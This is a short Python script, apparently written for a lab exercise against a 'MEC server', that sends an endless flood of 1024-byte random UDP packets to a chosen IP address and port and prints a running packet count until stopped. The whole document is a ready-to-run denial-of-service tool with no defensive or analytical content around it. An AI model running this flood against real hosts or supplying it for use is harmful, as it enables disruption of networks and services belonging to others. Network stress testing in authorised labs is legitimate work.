import socket
import random
import time

# Replace with your lab's MEC Server IP
target_ip = "192.168.1.1" 
target_port = 80  # Or any open port on the MEC server

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
payload = random.randbytes(1024)

print(f"Starting UDP Flood on {target_ip}:{target_port}...")
print("Press Ctrl+C to stop.")

try:
    packet_count = 0
    while True:
        sock.sendto(payload, (target_ip, target_port))
        packet_count += 1
        if packet_count % 10000 == 0:
            print(f"Sent {packet_count} packets...")
except KeyboardInterrupt:
    print("\nAttack stopped.")